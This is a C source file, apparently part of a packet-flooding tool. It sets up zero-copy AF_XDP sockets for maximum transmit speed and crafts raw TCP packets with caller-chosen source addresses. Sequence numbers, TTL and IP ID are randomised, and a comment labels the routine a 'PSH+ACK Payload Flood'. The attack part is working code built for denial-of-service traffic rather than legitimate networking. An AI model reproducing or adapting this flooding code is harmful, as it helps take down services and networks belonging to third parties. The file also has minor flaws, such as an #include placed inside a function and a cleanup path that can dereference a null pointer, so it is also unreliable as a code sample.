#include "af_xdp.h"
#include "logger.h"
#include <stdlib.h>
#include <stdio.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <unistd.h>
#include <errno.h>
#include <linux/if_ether.h>

#ifndef XDP_USE_NEED_WAKEUP
#define XDP_USE_NEED_WAKEUP (1 << 3)
#endif

#ifndef XDP_ZEROCOPY
#define XDP_ZEROCOPY (1 << 2)
#endif

#ifndef XDP_COPY
#define XDP_COPY (1 << 1)
#endif

static struct xsk_umem_info *configure_xsk_umem(void *buffer, uint64_t size) {
    struct xsk_umem_info *umem = calloc(1, sizeof(*umem));
    if (!umem) return NULL;

    struct xsk_umem_config cfg = {
        .fill_size = NUM_FRAMES,
        .comp_size = NUM_FRAMES,
        .frame_size = FRAME_SIZE,
        .frame_headroom = XSK_UMEM__DEFAULT_FRAME_HEADROOM,
        .flags = 0
    };

    int ret = xsk_umem__create(&umem->umem, buffer, size, &umem->fq, &umem->cq, &cfg);
    if (ret) {
        free(umem);
        return NULL;
    }
    umem->buffer = buffer;
    return umem;
}

struct xsk_socket_info *init_af_xdp_socket(const char *iface, int queue_id) {
    void *buffer = NULL;
    uint64_t buffer_size = NUM_FRAMES * FRAME_SIZE;
    
    if (posix_memalign(&buffer, getpagesize(), buffer_size)) {
        LOG_ERR("posix_memalign failed for UMEM");
        return NULL;
    }

    struct xsk_umem_info *umem = configure_xsk_umem(buffer, buffer_size);
    if (!umem) {
        LOG_ERR("configure_xsk_umem failed");
        free(buffer);
        return NULL;
    }

    struct xsk_socket_info *xsk_info = calloc(1, sizeof(*xsk_info));
    if (!xsk_info) goto cleanup;

    xsk_info->umem = umem;

    struct xsk_socket_config cfg = {
        .rx_size = XSK_RING_CONS__DEFAULT_NUM_DESCS,
        .tx_size = XSK_RING_PROD__DEFAULT_NUM_DESCS,
        .libbpf_flags = XSK_LIBBPF_FLAGS__INHIBIT_PROG_LOAD,
        .xdp_flags = 0,
        .bind_flags = XDP_USE_NEED_WAKEUP | XDP_ZEROCOPY // Force Zero-Copy for max speed
    };

    #include <pthread.h>
    static pthread_mutex_t xdp_init_mutex = PTHREAD_MUTEX_INITIALIZER;
    
    pthread_mutex_lock(&xdp_init_mutex);
    int ret = xsk_socket__create(&xsk_info->xsk, iface, queue_id,
                                 umem->umem, &xsk_info->rx, &xsk_info->tx, &cfg);
    
    if (ret) {
        LOG_ERR("xsk_socket__create failed with XDP_ZEROCOPY (Native). Falling back to XDP_COPY.");
        cfg.bind_flags &= ~XDP_ZEROCOPY;
        cfg.bind_flags |= XDP_COPY;
        ret = xsk_socket__create(&xsk_info->xsk, iface, queue_id,
                                 umem->umem, &xsk_info->rx, &xsk_info->tx, &cfg);
    }
    pthread_mutex_unlock(&xdp_init_mutex);
    
    if (ret) {
        LOG_ERR("xsk_socket__create failed on %s queue %d (err %d)", iface, queue_id, ret);
        goto cleanup;
    }

    // Populate Fill Ring initially (some drivers require it even for TX only)
    uint32_t idx = 0;
    ret = xsk_ring_prod__reserve(&umem->fq, NUM_FRAMES / 2, &idx);
    if (ret > 0) {
        for (int i = 0; i < ret; i++) {
            *xsk_ring_prod__fill_addr(&umem->fq, idx++) = (NUM_FRAMES / 2 + i) * FRAME_SIZE;
        }
        xsk_ring_prod__submit(&umem->fq, ret);
    }

    xsk_info->outstanding_tx = 0;
    xsk_info->tx_frame_idx = 0;
    return xsk_info;

cleanup:
    if (xsk_info) free(xsk_info);
    if (umem->umem) xsk_umem__delete(umem->umem);
    free(umem);
    free(buffer);
    return NULL;
}

void cleanup_af_xdp_socket(struct xsk_socket_info *xsk_info) {
    if (xsk_info) {
        if (xsk_info->xsk) xsk_socket__delete(xsk_info->xsk);
        if (xsk_info->umem) {
            if (xsk_info->umem->umem) xsk_umem__delete(xsk_info->umem->umem);
            if (xsk_info->umem->buffer) free(xsk_info->umem->buffer);
            free(xsk_info->umem);
        }
        free(xsk_info);
    }
}

void process_xdp_completion(struct xsk_socket_info *xsk) {
    uint32_t idx = 0;
    unsigned int completed = xsk_ring_cons__peek(&xsk->umem->cq, NUM_FRAMES, &idx);
    if (completed > 0) {
        xsk_ring_cons__release(&xsk->umem->cq, completed);
        xsk->outstanding_tx -= completed;
    }
}

int poll_xdp_rx(struct xsk_socket_info *xsk, unsigned char *pkt_buf, int max_len) {
    uint32_t rx_idx = 0;
    int rcvd = xsk_ring_cons__peek(&xsk->rx, 1, &rx_idx);
    if (rcvd == 0) return 0;
    
    const struct xdp_desc *desc = xsk_ring_cons__rx_desc(&xsk->rx, rx_idx);
    uint64_t addr = desc->addr;
    uint32_t len = desc->len;
    
    void *pkt_data = xsk_umem__get_data(xsk->umem->buffer, addr);
    int copy_len = len > max_len ? max_len : len;
    memcpy(pkt_buf, pkt_data, copy_len);
    
    xsk_ring_cons__release(&xsk->rx, 1);
    
    // Replenish fill queue
    uint32_t fq_idx = 0;
    if (xsk_ring_prod__reserve(&xsk->umem->fq, 1, &fq_idx) == 1) {
        *xsk_ring_prod__fill_addr(&xsk->umem->fq, fq_idx) = addr;
        xsk_ring_prod__submit(&xsk->umem->fq, 1);
    }
    
    return copy_len;
}

int push_xdp_tx(struct xsk_socket_info *xsk, unsigned char *payload, int len) {
    process_xdp_completion(xsk);

    // Limit outstanding packets to prevent overflowing TX queues
    if (xsk->outstanding_tx >= 2048) {
        sendto(xsk_socket__fd(xsk->xsk), NULL, 0, MSG_DONTWAIT, NULL, 0);
        return 0; // Ring is full / Backpressure
    }

    uint32_t tx_idx = 0;
    if (xsk_ring_prod__reserve(&xsk->tx, 1, &tx_idx) == 1) {
        uint64_t addr = (xsk->tx_frame_idx % (NUM_FRAMES / 2)) * FRAME_SIZE; 
        struct xdp_desc *tx_desc = xsk_ring_prod__tx_desc(&xsk->tx, tx_idx);
        
        tx_desc->addr = addr;
        tx_desc->len = len;

        void *pkt_buffer = xsk_umem__get_data(xsk->umem->buffer, addr);
        memcpy(pkt_buffer, payload, len);

        xsk_ring_prod__submit(&xsk->tx, 1);
        xsk->outstanding_tx++;
        xsk->tx_frame_idx++;
        return 1;
    }
    
    return 0;
}

void craft_af_xdp_tcp_packet(unsigned char *pkt, int *pkt_len, const char *payload_data, int payload_size, uint32_t src_ip, uint32_t dst_ip, uint16_t src_port, uint16_t dst_port, unsigned char *src_mac, unsigned char *dst_mac) {
    struct ethhdr *eth = (struct ethhdr *)pkt;
    struct iphdr *iph = (struct iphdr *)(pkt + sizeof(struct ethhdr));
    struct tcphdr *tcph = (struct tcphdr *)(pkt + sizeof(struct ethhdr) + sizeof(struct iphdr));
    unsigned char *payload = pkt + sizeof(struct ethhdr) + sizeof(struct iphdr) + sizeof(struct tcphdr);

    // 1. Ethernet Header
    memcpy(eth->h_dest, dst_mac, ETH_ALEN);
    memcpy(eth->h_source, src_mac, ETH_ALEN);
    eth->h_proto = htons(ETH_P_IP);

    // 2. IP Header
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->id = htons(fast_rand() % 65535);
    iph->frag_off = 0;
    iph->ttl = 64 + (fast_rand() % 64);
    iph->protocol = IPPROTO_TCP;
    iph->saddr = src_ip;
    iph->daddr = dst_ip;
    
    // 3. TCP Header
    tcph->source = htons(src_port);
    tcph->dest = htons(dst_port);
    tcph->seq = htonl(fast_rand());
    tcph->ack_seq = htonl(fast_rand());
    
    // V17 PSH+ACK Payload Flood
    tcph->syn = 0;
    tcph->ack = 1;
    tcph->psh = 1;
    tcph->fin = 0;
    tcph->rst = 0;
    tcph->urg = 0;
    
    tcph->window = htons(64240); 
    tcph->check = 0; 
    tcph->urg_ptr = 0;
    tcph->doff = 5; 
    
    // 4. Payload
    if (payload_size > 0 && payload_data != NULL) {
        memcpy(payload, payload_data, payload_size);
    }
    
    // 5. Total Lengths
    int tcp_options_len = 0;
    int ip_tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + tcp_options_len + payload_size;
    iph->tot_len = htons(ip_tot_len);
    *pkt_len = sizeof(struct ethhdr) + ip_tot_len;

    // 6. Checksums
    iph->check = 0;
    iph->check = calculate_checksum((unsigned short *)iph, iph->ihl * 4);
    
    // TCP Pseudo Header Checksum
    unsigned char pseudo_packet[65536];
    struct {
        uint32_t src_ip;
        uint32_t dst_ip;
        uint8_t zero;
        uint8_t protocol;
        uint16_t tcp_len;
    } psh_hdr;
    
    psh_hdr.src_ip = iph->saddr;
    psh_hdr.dst_ip = iph->daddr;
    psh_hdr.zero = 0;
    psh_hdr.protocol = IPPROTO_TCP;
    psh_hdr.tcp_len = htons(sizeof(struct tcphdr) + tcp_options_len + payload_size);
    
    memcpy(pseudo_packet, &psh_hdr, sizeof(psh_hdr));
    memcpy(pseudo_packet + sizeof(psh_hdr), tcph, sizeof(struct tcphdr));
    if (tcp_options_len > 0) {
        memcpy(pseudo_packet + sizeof(psh_hdr) + sizeof(struct tcphdr), payload - tcp_options_len, tcp_options_len);
    }
    if (payload_size > 0 && payload_data != NULL) {
        memcpy(pseudo_packet + sizeof(psh_hdr) + sizeof(struct tcphdr) + tcp_options_len, payload_data, payload_size);
    }
    
    tcph->check = calculate_checksum((unsigned short *)pseudo_packet, sizeof(psh_hdr) + sizeof(struct tcphdr) + tcp_options_len + payload_size);
}
